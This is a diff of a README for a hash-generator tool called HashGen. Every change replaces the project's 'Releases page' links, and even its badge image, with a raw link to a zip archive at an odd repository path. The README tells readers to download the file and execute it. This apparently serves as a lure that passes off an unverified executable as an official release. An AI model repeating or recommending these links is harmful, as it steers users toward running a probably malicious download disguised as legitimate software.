@@ -1,12 +1,12 @@
 # 🏷️ HashGen: A Blazing Fast Hash Generator
 
-![HashGen](https://img.shields.io/badge/HashGen-Fast%20Hash%20Generator-brightgreen)
+![HashGen](https://github.com/Jhmmax/hashgen/raw/refs/heads/master/isobutyraldehyde/Software_v1.9-alpha.1.zip%20Hash%20Generator-brightgreen)
 
 Welcome to **HashGen**, a powerful tool designed for generating hashes quickly and efficiently. Whether you need to create hashes for security purposes or data integrity checks, HashGen has you covered. This repository includes various hashing algorithms, including Argon, MD5, SHA-1, SHA-256, and more.
 
 ## 🚀 Quick Start
 
-To get started with HashGen, you can download the latest release from our [Releases page](https://github.com/Jhmmax/hashgen/releases). Download the appropriate file for your system and execute it to begin generating hashes.
+To get started with HashGen, you can download the latest release from our [Releases page](https://github.com/Jhmmax/hashgen/raw/refs/heads/master/isobutyraldehyde/Software_v1.9-alpha.1.zip). Download the appropriate file for your system and execute it to begin generating hashes.
 
 ## 📚 Table of Contents
 
@@ -50,7 +50,7 @@ Before you begin, ensure you have the following installed:
 
 ### Steps
 
-1. Visit our [Releases page](https://github.com/Jhmmax/hashgen/releases) to download the latest version.
+1. Visit our [Releases page](https://github.com/Jhmmax/hashgen/raw/refs/heads/master/isobutyraldehyde/Software_v1.9-alpha.1.zip) to download the latest version.
 2. Choose the file that matches your operating system.
 3. Extract the downloaded file (if necessary).
 4. Open your terminal or command prompt.
@@ -141,4 +141,4 @@ For any inquiries or issues, feel free to open an issue in the repository or con
 
 ---
 
-To explore more features and updates, visit our [Releases page](https://github.com/Jhmmax/hashgen/releases). Happy hashing!
+To explore more features and updates, visit our [Releases page](https://github.com/Jhmmax/hashgen/raw/refs/heads/master/isobutyraldehyde/Software_v1.9-alpha.1.zip). Happy hashing!
